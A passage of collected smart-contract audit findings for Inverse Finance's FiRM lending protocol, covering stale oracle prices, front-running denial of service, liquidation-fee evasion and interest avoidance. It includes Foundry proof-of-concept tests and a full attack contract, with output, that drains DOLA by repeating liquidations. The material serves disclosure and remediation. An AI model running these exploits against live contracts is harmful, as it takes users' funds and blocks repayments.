380517648599 ~~~  To borrow 1,000,000 DOLA we would thus need 380,517,648,599,000,000 small loans.  ### Economical feasibility  The attack would be economically feasible if the costs of the attack were lower than the interest that accrued throughout the successful attack. The dominating factor of the attack costs is the gas costs which the attacker needs to pay to update the accrued interest of the small loans every second. A clever attacker would batch as many updates into a single transaction as possible to minimize the gas overhead of the transaction. Still, at the current block time (12s), gas price (7 gwei), block gas limit (30,000,000), and current ETH price (\$1,550.80), it's hardly imaginable that this attack is economically feasible at the moment.  ### Risk parameters  However, all these values could change in the future. And if we look at other networks, Layer2 or EVM compatible Layer1, the parameters might be different today.  Also, notice that if the contract were used to borrow a different asset than DOLA, the numbers would look drastically different. The risk increases with the asset's price and becomes bigger the fewer decimals the token uses. For example, to borrow 1 WBTC (8 decimals), we would only need 39 small loans:  ~~~ #loans = 10^8 / 2,627,999 ~39 ~~~  And to borrow WBTC worth \$1,000,000 at a price of 20,746\$/BTC, we would need 1864 small loans.  ~~~ #loans ~= 49*10^8 / 2,627,999 ~= 1864 ~~~  ### Foundry  The following test demonstrates how to avoid paying interest on a loan for 1h. A failing test means that the attack was successful.  ~~~ $ git diff src/test/DBR.t.sol diff --git a/src/test/DBR.t.sol b/src/test/DBR.t.sol index 3988cf7..8779da7 100644 --- a/src/test/DBR.t.sol +++ b/src/test/DBR.t.sol @@ -25,6 +25,20 @@ contract DBRTest is FiRMTest {          vm.stopPrank();      }   +    function testFail_free_borrow() public { +        uint borrowAmount =  2_627_999; + +        vm.prank(address(market)); +        dbr.onBorrow(user, borrowAmount); + +        for (uint i = 12; i <= 3600; i += 12) { +            vm.warp(block.timestamp + 12); +            dbr.accrueDueTokens(user); +        } +        assertEq(dbr.deficitOf(user), 0); +    } + +      function testOnBorrow_Reverts_When_AccrueDueTokensBringsUserDbrBelow0() public {          gibWeth(user, wethTestAmount);          gibDBR(user, wethTestAmount); ~~~  Output: ~~~ $ forge test --match-test testFail_free_borrow -vv [⠆] Compiling... [⠊] Compiling 1 files with 0.8.17 [⠢] Solc 0.8.17 finished in 2.62s Compiler run successful  Running 1 test for src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543) Test result: FAILED. 0 passed; 1 failed; finished in 8.03ms  Failing tests: Encountered 1 failing test in src/test/DBR.t.sol:DBRTest [FAIL. Reason: Assertion failed.] testFail_free_borrow() (gas: 1621543)  Encountered a total of 1 failing tests, 0 tests succeeded ~~~  Classified as a high medium because the yields can get stolen/denied. It's not high risk because I don't see an economically feasible exploit.  ## Tools Used  VSCode, Wolramapha, Foundry  ## Recommended Mitigation Steps  * Document the risks transparently and prominently. * Re-evaluate the risks according to the specific network parameters of every network you want to deploy to. * Do not update the `lastUpdated` timestamp of the user if the computed accrued amount was zero.
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363   # Vulnerability details  ## Impact Calling the `Oracle` contract's `viewPrice` or `getPrice` function executes `uint price = feeds[token].feed.latestAnswer()` and `require(price > 0, "Invalid feed price")`. Besides that Chainlink's `latestAnswer` function is deprecated, only verifying that `price > 0` is true is also not enough to guarantee that the returned `price` is not stale. Using a stale `price` can cause the calculations for the credit and withdrawal limits to be inaccurate, which, for example, can mistakenly consider a user's debt to be under water and unexpectedly allow the user's debt to be liquidated.  To avoid using a stale answer returned by the Chainlink oracle data feed, according to [Chainlink's documentation](https://docs.chain.link/docs/historical-price-data): 1. The `latestRoundData` function can be used instead of the deprecated `latestAnswer` function. 2. `roundId` and `answeredInRound` are also returned. "You can check `answeredInRound` against the current `roundId`. If `answeredInRound` is less than `roundId`, the answer is being carried over. If `answeredInRound` is equal to `roundId`, then the answer is fresh." 3. "A read can revert if the caller is requesting the details of a round that was invalid or has not yet been answered. If you are deriving a round ID without having observed it before, the round might not be complete. To check the round, validate that the timestamp on that round is not 0."    https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L78-L105 ```solidity     function viewPrice(address token, uint collateralFactorBps) external view returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, "Invalid feed price");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             uint day = block.timestamp / 1 days;             // get today's low             uint todaysLow = dailyLows[token][day];             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert("Price not found");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L112-L144 ```solidity     function getPrice(address token, uint collateralFactorBps) external returns (uint) {         if(fixedPrices[token] > 0) return fixedPrices[token];         if(feeds[token].feed != IChainlinkFeed(address(0))) {             // get price from feed             uint price = feeds[token].feed.latestAnswer();             require(price > 0, "Invalid feed price");             // normalize price             uint8 feedDecimals = feeds[token].feed.decimals();             uint8 tokenDecimals = feeds[token].tokenDecimals;             uint8 decimals = 36 - feedDecimals - tokenDecimals;             uint normalizedPrice = price * (10 ** decimals);             // potentially store price as today's low             uint day = block.timestamp / 1 days;             uint todaysLow = dailyLows[token][day];             if(todaysLow == 0 || normalizedPrice < todaysLow) {                 dailyLows[token][day] = normalizedPrice;                 todaysLow = normalizedPrice;                 emit RecordDailyLow(token, normalizedPrice);             }             // get yesterday's low             uint yesterdaysLow = dailyLows[token][day - 1];             // calculate new borrowing power based on collateral factor             uint newBorrowingPower = normalizedPrice * collateralFactorBps / 10000;             uint twoDayLow = todaysLow > yesterdaysLow && yesterdaysLow > 0 ? yesterdaysLow : todaysLow;             if(twoDayLow > 0 && newBorrowingPower > twoDayLow) {                 uint dampenedPrice = twoDayLow * 10000 / collateralFactorBps;                 return dampenedPrice < normalizedPrice ? dampenedPrice: normalizedPrice;             }             return normalizedPrice;          }         revert("Price not found");     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L344-L347 ```solidity     function getCreditLimitInternal(address user) internal returns (uint) {         uint collateralValue = getCollateralValueInternal(user);         return collateralValue * collateralFactorBps / 10000;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L323-L327 ```solidity     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;     } ```  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L353-L363 ```solidity     function getWithdrawalLimitInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         if(collateralBalance == 0) return 0;         uint debt = debts[user];         if(debt == 0) return collateralBalance;         if(collateralFactorBps == 0) return 0;         uint minimumCollateral = debt * 1 ether / oracle.getPrice(address(collateral), collateralFactorBps) * 10000 / collateralFactorBps;         if(collateralBalance <= minimumCollateral) return 0;         return collateralBalance - minimumCollateral;     } ```  ## Proof of Concept The following steps can occur for the described scenario. 1. Alice calls the `depositAndBorrow` function to deposit some WETH as the collateral and borrows some DOLA against the collateral. 2. Bob calls the `liquidate` function for trying to liquidate Alice's debt. Because the Chainlink oracle data feed returns an up-to-date price at this moment, the `getCreditLimitInternal` function calculates Alice's credit limit accurately, which does not cause Alice's debt to be under water. Hence, Bob's `liquidate` transaction reverts. 3. After some time, Bob calls the `liquidate` function again for trying to liquidate Alice's debt. This time, because the Chainlink oracle data feed returns a positive but stale price, the `getCreditLimitInternal` function calculates Alice's credit limit inaccurately, which mistakenly causes Alice's debt to be under water. 4. Bob's `liquidate` transaction is executed successfully so he gains some of Alice's WETH collateral. Alice loses such WETH collateral amount unexpectedly because her debt should not be considered as under water if the stale price was not used.  ## Tools Used VSCode  ## Recommended Mitigation Steps https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L82-L83 and https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L116-L117 can be updated to the following code. ```solidity             (uint80 roundId, int256 answer, , uint256 updatedAt, uint80 answeredInRound) = feeds[token].feed.latestRoundData();             require(answeredInRound >= roundId, "answer is stale");             require(updatedAt > 0, "round is incomplete");             require(answer > 0, "Invalid feed answer");              uint256 price = uint256(answer); ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L87 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Oracle.sol#L121   # Vulnerability details  ## Impact  The `Oracle` contract normalizes prices in both `viewPrices` and `getPrices` functions to adjust for potential decimal differences between feed and token decimals and the expected return value.   However these functions assume that `feedDecimals` and `tokenDecimals` won't exceed 18 since the normalization calculation is `36 - feedDecimals - tokenDecimals`, or that at worst case the sum of both won't exceed 36.  This assumption should be safe for certain cases, for example WETH is 18 decimals and the ETH/USD chainlink is 8 decimals, but may cause an overflow (and a revert) for the general case, rendering the Oracle useless in these cases.  ## Proof of Concept  If `feedDecimals + tokenDecimals > 36` then the expression `36 - feedDecimals - tokenDecimals` will be negative and (due to Solidity 0.8 default checked math) will cause a revert.  ## Recommended Mitigation Steps  In case `feedDecimals + tokenDecimals` exceeds 36, then the proper normalization procedure would be to **divide** the price by `10 ** decimals`. Something like this:  ``` uint normalizedPrice;  if (feedDecimals + tokenDecimals > 36) {     uint decimals = feedDecimals + tokenDecimals - 36;     normalizedPrice = price / (10 ** decimals) } else {     uint8 decimals = 36 - feedDecimals - tokenDecimals;     normalizedPrice = price * (10 ** decimals); } ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L562   # Vulnerability details  ## Impact If a user wants to completely forceReplenish a borrower with deficit, the borrower or any other malicious party can front run this with a dust amount to prevent the replenish.  ## Proof of Concept ```javascript     function testForceReplenishFrontRun() public {         gibWeth(user, wethTestAmount);         gibDBR(user, wethTestAmount / 14);         uint initialReplenisherDola = DOLA.balanceOf(replenisher);          vm.startPrank(user);         deposit(wethTestAmount);         uint borrowAmount = getMaxBorrowAmount(wethTestAmount);         market.borrow(borrowAmount);         uint initialUserDebt = market.debts(user);         uint initialMarketDola = DOLA.balanceOf(address(market));         vm.stopPrank();          vm.warp(block.timestamp + 5 days);         uint deficitBefore = dbr.deficitOf(user);         vm.startPrank(replenisher);          market.forceReplenish(user,1); // front run DoS          vm.expectRevert("Amount > deficit");         market.forceReplenish(user, deficitBefore); // fails due to amount being larger than deficit                  assertEq(DOLA.balanceOf(replenisher), initialReplenisherDola, "DOLA balance of replenisher changed");         assertEq(DOLA.balanceOf(address(market)), initialMarketDola, "DOLA balance of market changed");         assertEq(DOLA.balanceOf(replenisher) - initialReplenisherDola, initialMarketDola - DOLA.balanceOf(address(market)),             "DOLA balance of market did not decrease by amount paid to replenisher");         assertEq(dbr.deficitOf(user), deficitBefore-1, "Deficit of borrower was not fully replenished");          // debt only increased by dust         assertEq(market.debts(user) - initialUserDebt, 1 * replenishmentPriceBps / 10000, "Debt of borrower did not increase by replenishment price");     } ``` This requires that the two txs end up in the same block. If they end up in different blocks the front run transaction will need to account for the increase in deficit between blocks.   ## Tools Used vscode, forge  ## Recommended Mitigation Steps Use `min(deficit,amount)` as amount to replenish 
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L566   # Vulnerability details  ## Impact Users abels to invoke `forceReplenish()` when they are on liquidation position  ## Proof of Concept On `Market.sol` ==>  `forceReplenish()` On this line  ``` uint collateralValue = getCollateralValueInternal(user); ```  `getCollateralValueInternal(user)` only return the value of the collateral  ```     function getCollateralValueInternal(address user) internal returns (uint) {         IEscrow escrow = predictEscrow(user);         uint collateralBalance = escrow.balance();         return collateralBalance * oracle.getPrice(address(collateral), collateralFactorBps) / 1 ether;  ``` So if the user have 1.5 wETH at the price of  1 ETH = 1600 USD It will return `1.5 * 1600` and this value is the real value we can’t just check it directly with the debt like this  ```  require(collateralValue >= debts[user], "Exceeded collateral value"); ``` This is no longer `over collateralized` protocol  The value needs to be multiplied by `collateralFactorBps / 10000` -  So depending on the value of `collateralFactorBps` and `liquidationFactorBps` the user could be in the liquidation position but he is able to invoke `forceReplenish()` to cover all their `dueTokensAccrued[user]` on `DBR.sol` and get more `DOLA` -  or it will lead a healthy debt to be in the liquidation position after invoking `forceReplenish()` -   ## Recommended Mitigation Steps Use `getCreditLimitInternal()` rather than `getCollateralValueInternal()`.  
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Oracle.sol#L91   # Vulnerability details  ## Impact Oracle's `viewPrice` function doesn't report a dampened price until `getPrice` is called and today's price is updated. This will impact the public read-only functions that call it: - [getCollateralValue](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L312); - [getCreditLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L334) (calls `getCollateralValue`); - [getLiquidatableDebt](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L578) (calls `getCreditLimit`); - [getWithdrawalLimit](https://github.com/code-423n4/2022-10-inverse/blob/3e81f0f5908ea99b36e6ab72f13488bbfe622183/src/Market.sol#L370).  These functions are used to get on-chain state and prepare values for write calls (e.g. calculate withdrawal amount before withdrawing or calculate a user's debt that can be liquidated before liquidating it). Thus, wrong values returned by these functions can cause withdrawal of a wrong amount or liquidation of a wrong debt or cause reverts. ## Proof of Concept ```solidity // src/test/Oracle.t.sol function test_viewPriceNoDampenedPrice_AUDIT() public {     uint collateralFactor = market.collateralFactorBps();     uint day = block.timestamp / 1 days;     uint feedPrice = ethFeed.latestAnswer();      //1600e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), day), feedPrice);      vm.warp(block.timestamp + 1 days);     uint newPrice = 1200e18;     ethFeed.changeAnswer(newPrice);     //1200e18 price saved as daily low     oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      vm.warp(block.timestamp + 1 days);     newPrice = 3000e18;     ethFeed.changeAnswer(newPrice);      //1200e18 should be twoDayLow, 3000e18 is current price. We should receive dampened price here.     // Notice that viewPrice is called before getPrice.     uint viewPrice = oracle.viewPrice(address(WETH), collateralFactor);     uint price = oracle.getPrice(address(WETH), collateralFactor);     assertEq(oracle.dailyLows(address(WETH), ++day), newPrice);      assertEq(price, 1200e18 * 10_000 / collateralFactor);      // View price wasn't dampened.     assertEq(viewPrice, 3000e18); } ``` ## Tools Used Manual review ## Recommended Mitigation Steps Consider this change: ```diff --- a/src/Oracle.sol +++ b/src/Oracle.sol @@ -89,6 +89,9 @@ contract Oracle {              uint day = block.timestamp / 1 days;              // get today's low              uint todaysLow = dailyLows[token][day]; +            if(todaysLow == 0 || normalizedPrice < todaysLow) { +                todaysLow = normalizedPrice; +            }              // get yesterday's low              uint yesterdaysLow = dailyLows[token][day - 1];              // calculate new borrowing power based on collateral factor ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L559 https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L591   # Vulnerability details  ## Impact  For a lending pool, borrower's debt healthness can be decided by the health factor, i.e. the collateral value divided by debt. ($C/D$)  The less the health factor is, the borrower's collateral is more risky of being liquidated.  Liquidation is supposed to make the borrower healthier (by paying debts and claiming some collateral), or else continuous liquidations can follow up and this can lead to a so-called [liquidation crisis](https://medium.com/coinmonks/what-is-liquidation-in-defi-lending-and-borrowing-platforms-3326e0ba8d0).  In a normal lending protocol, borrower's debt is limited by collateral factor in any case.  For this protocol, users can force replenishment for the addresses in deficit and the replenishment increases the borrower's debt.  And in the current implementation the replenishment is limited so that the new debt is not over than the collateral value.  As we will see below, this limitation is not enough and if the borrower's debt is over some threshold (still less than collateral value), liquidation makes the borrower debt "unhealthier".  And repeating liquidation can lead to various problems and we will even show an example that the attacker can take the DOLA out of the market.  ## Proof of Concept  ### Terminology  $C_f$ - collateralFactorBps / 10000  $L_i$ - liquidationIncentiveBps / 10000  $L_{fe}$ - liquidationFeeBps / 10000  $L_{fa}$ - liquidationFactorBps / 10000  $D$ - user's debt recognized by the market  $C$ - user's collateral held by the escrow  $P$ - collateral price in DOLA, 1 collateral = $P$ DOLAs. For simplicity, assumed to be a constant.  Constraints on the parameters in the current implementation  All parameters are in range $(0,1)$ and $L_{fe}+L_i<1$.  #### Condition for liquidation  1. Debt is over the credit limit        $D>C_f  C  P$  2. Liquidation amount is limited by liquidation factor times user debt.        $x\le L_{fa}D$  #### Study  We will explore a condition when the liquidation will decrease the health factor after liquidation of $x$.  After liquidation, borrower's new debt is $D-x$ and the collateral value is $CP-x(1+L_i+L_{fe})$ (in DOLA) due to the incentives and fee.  Let us see when the new health factor can be less than the previous health factor.  $\frac {CP-x(1+L_i+L_{fe})}{D-x} < \frac {CP}{D}$  $CP<D(1+L_i+L_{fe})$  $D>\frac{CP}{1+L_i+L_{fe}}$  So if the borrower's debt is over some value depending on the collateral value and liquidation incentive and fee, liquidation of any amount will make the account unhealthier.  Note that the right hand of the above inequality is still less than the collateral value and it means one can intentionally increase an account debt via replenishment so that it is over the threshold.  Furthermore, we notice that it is even possible that the debt can be greater than the above threshold without any replenishment if $C_f>\frac {1}{1+L_i+L_{fe}}$. The example attacker is written assuming this case but considering the possible side effects of replenishment, we suggest limiting the liquidation function so that it can not decrease the health factor.  #### Example  For $C_f=0.85, L_{fe}=0.01, L_{fa}=0.5, L_i=0.18$, an attacker can take DOLA out of protocol as below. We believe that these parameters are quite realistic. For these parameters, if an attacker borrows as much as it can, then the debt becomes greater than the threshold already without any replenishment.  ```solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13;  import "forge-std/Test.sol"; import "../DBR.sol"; import "../Market.sol"; import "./FiRMTest.sol";  contract Attack_2 is FiRMTest {     address operator;      function setUp() public {         vm.label(gov, "operator");         operator = gov;          collateralFactorBps = 8500;         liquidationBonusBps = 1800;         replenishmentPriceBps = 50000;          initialize(replenishmentPriceBps, collateralFactorBps, replenishmentIncentiveBps, liquidationBonusBps, callOnDepositCallback);          vm.startPrank(gov);         market.setLiquidationFeeBps(100);         market.setLiquidationFactorBps(5000);         vm.stopPrank();          vm.startPrank(chair);         fed.expansion(IMarket(address(market)), 1_000_000e18);         vm.stopPrank();     }       function getMaxForceReplenishable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral         uint256 currentDeficit = dbr.deficitOf(user);         uint256 limitByCollateralValue = 0;         if(market.getCollateralValue(user) > market.debts(user))         {             limitByCollateralValue = (market.getCollateralValue(user) - market.debts(user)) * 10000 / dbr.replenishmentPriceBps();         }          return currentDeficit <= limitByCollateralValue ? currentDeficit : limitByCollateralValue;     }      function getMaxLiquidatable(address user) public view returns (uint) {         // once the debt is over the collateral value, getLiquidatableDebt might return more than what are actually in the collateral          uint256 limitByLiquidationFactor = market.getLiquidatableDebt(user);         uint256 limitByLiquidationReward = market.getCollateralValue(user) * 10000 / (10000 + market.liquidationFeeBps() + market.liquidationIncentiveBps());          return limitByLiquidationFactor >= limitByLiquidationReward ? limitByLiquidationReward : limitByLiquidationFactor;     }      function userTotalValue(address user) public view returns (uint256) {         uint P = ethFeed.latestAnswer() / 1e18;         uint256 totalValue = DOLA.balanceOf(user) / P + WETH.balanceOf(user);         // if the collateral value is greater than the debt, the total value includes the difference because user can repay debt and claim the collateral back         if(market.getCollateralValue(user) > market.debts(user))             totalValue += (market.getCollateralValue(user) - market.debts(user))/P;         return totalValue;     }      function testAttack_2() public {         uint P = ethFeed.latestAnswer() / 1e18; // assume the price stays the same          gibWeth(user, wethTestAmount); // 10^18, 1 eth for collateral         gibDOLA(user, wethTestAmount * P); // 10^18, 1 eth in DOLA for liquidation          // block 1         vm.startPrank(user);         deposit(wethTestAmount); // collateral          uint borrowAmount = market.getCreditLimit(user); // borrow as much as it can         market.borrow(borrowAmount);          emit log_named_decimal_uint("Total value before exploit", userTotalValue(user), 18);         emit log_named_uint("B", market.debts(user));         emit log_named_uint("D", market.debts(user));         emit log_named_uint("C", market.getCollateralValue(user));         emit log_named_decimal_uint("H", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);          // start liquidation         uint cycle = 1;         while(cycle < 100)         {             emit log_named_uint("Cycle", cycle);             uint256 liquidatable = getMaxLiquidatable(user);             if(liquidatable > 0)             {                 emit log("Liquidation");                 emit log_named_uint("L", liquidatable);                 market.liquidate(user, liquidatable); // liquidate as much as it can             }             else {                 emit log("Wait a block and force replenishment");                 vm.warp(block.timestamp + 1);                 uint256 replenishable = getMaxForceReplenishable(user);                 emit log_named_uint("R", replenishable); // force replenish as much as possible, this will incur some loss but will make the address liquidatable                 market.forceReplenish(user, replenishable);             }               emit log_named_uint("D", market.debts(user));             emit log_named_uint("C", market.getCollateralValue(user));             emit log_named_decimal_uint("H", market.getCollateralValue(user) * 1e18 / market.debts(user), 18);              ++ cycle;              uint256 totalValue = userTotalValue(user);             emit log_named_decimal_uint("Total value the user owns",  totalValue, 18);             if(totalValue > wethTestAmount * 2)                 break; // no need to continue, the attacker already took profit from the market         }     } }  ```  The test results are as below. We can see that the health factor is decreasing for every liquidation and this ultimately makes the debt greater than collateral value. Then the attacker's total value increases for every liquidation and finally it gets more value than the initial status.  ``` > forge test -vv --match-test testAttack_2   Total value before exploit: 2.000000000000000000   B: 1360000000000000000000   D: 1360000000000000000000   C: 1600000000000000000000   H: 1.176470588235294117   Cycle: 1   Wait a block and force replenishment   R: 43125317097919   D: 1360000215626585489595   C: 1600000000000000000000   H: 1.176470401707135551   Total value the user owns: 1.999999871971714865   Cycle: 2   Liquidation   L: 680000107813292744797   D: 680000107813292744798   C: 790799871702181636800   H: 1.162940803414271107   Total value the user owns: 1.995749871297881786   Cycle: 3   Liquidation   L: 340000053906646372399   D: 340000053906646372399   C: 386199807553272457600   H: 1.135881606828542227   Total value the user owns: 1.993624870960965247   Cycle: 4   Liquidation   L: 170000026953323186199   D: 170000026953323186200   C: 183899775478817868800   H: 1.081763213657084471   Total value the user owns: 1.992562370792506977   Cycle: 5   Liquidation   L: 85000013476661593100   D: 85000013476661593100   C: 82749759441590576000   H: 0.973526427314168978   Total value the user owns: 1.993437529480197230   Cycle: 6   Liquidation   L: 42500006738330796550   D: 42500006738330796550   C: 32174751422976931200   H: 0.757052854628338029   Total value the user owns: 1.998218780238259443   Cycle: 7   Liquidation   L: 21250003369165398275   D: 21250003369165398275   C: 6887247413670110400   H: 0.324105709256676206   Total value the user owns: 2.000609405617290549 ```  ## Tools Used  Foundry  ## Recommended Mitigation Steps  Make sure the liquidation does not decrease the health index in the function `liquidate`. With this mitigation, we also suggest limiting the debt increase in the function `forceReplenish` so that the new debt after replenish will not be over the threshold.  ```solidity function liquidate(address user, uint repaidDebt) public {     require(repaidDebt > 0, "Must repay positive debt");     uint debt = debts[user];     require(getCreditLimitInternal(user) < debt, "User debt is healthy");     require(repaidDebt <= debt * liquidationFactorBps / 10000, "Exceeded liquidation factor");      // ****************************************     uint beforeHealthFactor = getCollateralValue(user) * 1e18 / debt; // @audit remember the health factor before liquidation     // ****************************************      uint price = oracle.getPrice(address(collateral), collateralFactorBps); // collateral price in dola     uint liquidatorReward = repaidDebt * 1 ether / price; // collateral amount     liquidatorReward += liquidatorReward * liquidationIncentiveBps / 10000;     debts[user] -= repaidDebt;     totalDebt -= repaidDebt;      dbr.onRepay(user, repaidDebt);     dola.transferFrom(msg.sender, address(this), repaidDebt);     IEscrow escrow = predictEscrow(user);     escrow.pay(msg.sender, liquidatorReward);     if(liquidationFeeBps > 0) {         uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;         if(escrow.balance() >= liquidationFee) {             escrow.pay(gov, liquidationFee);         }     }      // ****************************************     uint afterHealthFactor = getCollateralValue(user) * 1e18 / debts[user]; // @audit health factor after liquidation     require(afterHealthFactor >= beforeHealthFactor, "Liquidation should not decrease the health factor of the address"); // @audit new check     // ****************************************      emit Liquidate(user, msg.sender, repaidDebt, liquidatorReward); }  function forceReplenish(address user, uint amount) public {     uint deficit = dbr.deficitOf(user);     require(deficit > 0, "No DBR deficit");     require(deficit >= amount, "Amount > deficit");     uint replenishmentCost = amount * dbr.replenishmentPriceBps() / 10000;     uint replenisherReward = replenishmentCost * replenishmentIncentiveBps / 10000;     debts[user] += replenishmentCost;     uint collateralValue = getCollateralValueInternal(user);      // ****************************************     // require(collateralValue >= debts[user], "Exceeded collateral value");     require(collateralValue >= debts[user] * (1 + liquidationIncentiveBps / 10000 + liquidationFeeBps / 10000), "Debt exceeds safe collateral limit"); // @audit more strict limit     // ****************************************      totalDebt += replenishmentCost;     dbr.onForceReplenish(user, amount);     dola.transfer(msg.sender, replenisherReward);     emit ForceReplenish(user, msg.sender, amount, replenishmentCost, replenisherReward); } ```
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610   # Vulnerability details  ## Impact User can free from liquidation fee if its escrow balance less than the calculated liquidation fee.  ## Proof of Concept If the `liquidationFeeBps` is enabled, the `gov` should receive the liquidation fee. But if user's escrow balance is less than the calculated liquidation fee, `gov` got nothing. https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L605-L610  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             }         } ```   ## Tools Used manual review  ## Recommended Mitigation Steps User should pay all the remaining escrow balance if the calculated liquidation fee is greater than its escrow balance.  ```solidity         if(liquidationFeeBps > 0) {             uint liquidationFee = repaidDebt * 1 ether / price * liquidationFeeBps / 10000;             if(escrow.balance() >= liquidationFee) {                 escrow.pay(gov, liquidationFee);             } else {                 escrow.pay(gov, escrow.balance());             }         } ```  
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531   # Vulnerability details  ## Impact In `repay()` users can repay their debt. ``` function repay(address user, uint amount) public {         uint debt = debts[user];         require(debt >= amount, "Insufficient debt");         debts[user] -= amount;         totalDebt -= amount;         dbr.onRepay(user, amount);         dola.transferFrom(msg.sender, address(this), amount);         emit Repay(user, msg.sender, amount);     } ```  There is a `require` condition, that checks if the amount provided, is greater than the debt of the user. If it is, then the function reverts. This is where the vulnerability arises.  `repay` function can be frontrun by an attacker. Say an attacker pay a small amount of debt for the victim user, by frontrunning his repay transaction. Now when the victim's transaction gets executed, the `require` condition will fail, as the amount of debt is less than the amount of DOLA provided. Hence the attacker can repeat the process to DOS the victim from calling the repay function.   ## Proof of Concept  1. Victim calls repay() function to pay his debt of 500 DOLA , by providing the amount as 500 2. Now attacker saw this transaction on mempool 3. Attacker frontruns the transaction, by calling repay() with amount provided as 1 DOLA 4. Attacker's transaction get's executed first due to frontrunning, which reduces the debt of the victim user to 499 DOLA 5. Now when the victim's transaction get's executed, the debt of victim has reduced to 499 DOLA, and the amount to repay provided was 500 DOLA. Now as debt is less than the amount provided, so the require function will fail, and the victim's transaction will revert. This will prevent the victim from calling repay function  Hence an attacker can DOS the repay function for the victim user  ## Tools Used Manual review  ## Recommended Mitigation Steps Implement DOS protection
# Lines of code  https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567   # Vulnerability details  ## Impact  A user can borrow DOLA interest-free. This requires the user to precisely manage their collateral. This issue might become especially troublesome if a Market is opened with some stablecoin as the collateral (because price fluctuations would become negligible and carefully managing collateral level would be easy).  This issue is harder to exploit (but not impossible) if `gov` takes responsibility for forcing replenishment, since `gov` has a stronger economic incentive than third parties.  ## Proof of Concept  If my calculations are correct, with the current gas prices it costs about \$5 to call `Market.forceReplenish(...)`. Thus  there is no economic incentive to do so as long as a debtor's DBR deficit is worth less than \$5/`replenishmentIncentive` so probably around \$100.  This is because replenishing cannot push a user's debt under the water (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L567) and a user can repay their debt without having settled the DBR deficit (https://github.com/code-423n4/2022-10-inverse/blob/main/src/Market.sol#L531).  So, assuming the current prices, a user can: 1. Deposit some collateral 2. Borrow close to the maximum allowed amount of DOLA 3. Keep withdrawing or depositing collateral so that the collateral surplus does not exceed $100 (assuming current gas prices) 4. `repay()` their debt at any time in the future. 5. Withdraw all the collateral.  All this is possible with arbitrarily large DBR deficit because due to small collateral surplus at no point was it economical for a third party to `forceReplenish()` the user. If `gov` takes responsibility for `forceReplenish()`ing, the above procedure is still viable although the user has to maintain the collateral surplus at no more than around $5.  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Allow replenishing to push the debt under the water and disallow repaying the debt with an outstanding DBR deficit. E.g.: ``` diff --git a/src/Market.sol b/src/Market.sol index 9585b85..d69b599 100644 --- 